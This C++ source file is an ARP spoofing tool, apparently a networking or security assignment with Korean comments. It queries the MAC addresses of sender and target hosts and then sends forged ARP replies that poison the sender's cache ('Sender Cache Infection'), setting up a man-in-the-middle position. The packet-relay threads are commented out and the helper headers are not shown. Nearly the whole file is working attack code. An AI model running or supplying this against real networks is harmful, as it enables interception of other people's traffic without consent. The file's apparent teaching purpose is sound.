#include "pch.h"
#include "ethhdr.h"
#include "mac.h"
#include "ip.h"
#include "arphdr.h"
#include "packetmanager.h"
#include "addressmanager.h"
#include "etharp.h"
#include "mylibnet.h"

void usage() {
	printf("syntax: arp_spoofer.out <interface> {sender_ip , target_ip } ...\n");
	printf("sample: send-arp-test wlan0 1.1.1.2 1.1.1.1\n");
}
/*--------------------------------------------------------------------------------------------------*/


/* messageQueue */
/* Consumer and Producer */
queue<pair<char*,struct pcap_pkthdr*>> relayQueue;
queue<pair<char*,struct pcap_pkthdr*>> infectionQueue;


/* 패킷 리스너와 패킷 센더 분리 */
/* 어드레스 매니저 sigleton */

/* thread 1 */


/* thread 2 */


bool getMac(Ip ip){
	PacketListner* pktlistner = PacketListner::getInstance();
	AddressManager* addrmanager = AddressManager::getInstacne();
	const u_char* packet;
	pcap_pkthdr* header;
	int res = pktlistner->capturePacket(packet,header);
	if(res!=0) return false;
	struct EthArpPacket *etharphdr = (struct EthArpPacket*)packet;
	struct EthHdr ethhdr = etharphdr->eth_;
	struct ArpHdr arphdr = etharphdr->arp_;
	if(ntohs(ethhdr.type_)!=0x0806) return false;
	Ip s_ip = ntohl(arphdr.sip_);
	Mac s_mac = arphdr.smac_;
	Ip t_ip = ntohl(arphdr.tip_);
	Mac t_mac = arphdr.tmac_;
	Mac mymac = addrmanager->getMyMac();
	if(string(s_ip)==string(ip)&&string(mymac)==string(t_mac)){
		addrmanager->addIpMac(s_ip,s_mac);
		return true;
	}
	return false;
}


int main(int argc, char* argv[]) {
	if (argc < 4 || argc%2!=0) {
		usage();
		return -1;
	}
	/* 클래스 초기화 */
	char* dev = argv[1]; 
	AddressManager* addrmanager = AddressManager::getInstacne();
	PacketListner* pktlistner = PacketListner::getInstance();
	PacketSender* pktsender = PacketSender::getInstance();
	addrmanager->initState(dev);
	pktlistner->initState(dev);
	pktsender->initState(dev);
	/* sender 및 target ip페어 초기화 */
	for(int i=2;i<argc;i+=2){
		string sender = string(argv[i]);
		string target = string(argv[i+1]);
		addrmanager->addSenTar(Ip(sender),Ip(target));
	}
	std::cout<<"=======================IP 및 MAC 주소 질의 ============================="<<endl;
	/* arp request 프로토콜로 Ip들의 Mac 주소를 질의 */
	vector<pair<Ip,Ip>> senNtar = addrmanager->getSenTar();
	Mac mymac = addrmanager->getMyMac();
	Ip myip = addrmanager->getMyIp();
    for(int i=0;i<senNtar.size();i++){
		Ip sen = senNtar[i].first;
		Ip tar = senNtar[i].second;
		cout<<"sender ip:"<<string(sen)<<endl;
		cout<<"target ip:"<<string(tar)<<endl;
		pktsender->sendArpPacket(Mac("FF:FF:FF:FF:FF:FF"),mymac,myip,Mac("00:00:00:00:00:00"),sen,1);
		while(true){
			if(getMac(sen)) break;
		}
		pktsender->sendArpPacket(Mac("FF:FF:FF:FF:FF:FF"),mymac,myip,Mac("00:00:00:00:00:00"),tar,1);
		while(true){
			if(getMac(tar)) break;
		}
	}
	std::cout<<"========================================================================"<<endl;
	std::cout<<"=======================Sender Cache Infection =========================="<<endl;
	/* arp cache table 감염 */
	map<string,Mac> IpMac = addrmanager->getIpMac();
	for(int i=0;i<senNtar.size();i++){
		Ip senIp = senNtar[i].first;
		Ip tarIp = senNtar[i].second;
		cout<<"Infect sender ip:"<<string(senIp)<<endl;
		cout<<"Infect target ip:"<<string(tarIp)<<endl;
		Mac senMac = IpMac[string(senIp)];
		Mac tarMac = IpMac[string(tarIp)];
		pktsender->sendArpPacket(senMac,mymac,tarIp,senMac,senIp,2);
	}
	std::cout<<"======================================================================"<<endl;



/* 
	thread t1(relayPacket,ref(packetmanager),ref(addrmanager));

	thread t2(producerNconsumer,ref(packetmanager));

	t1.join();
	t2.join();
 */
	

    return 0;
}
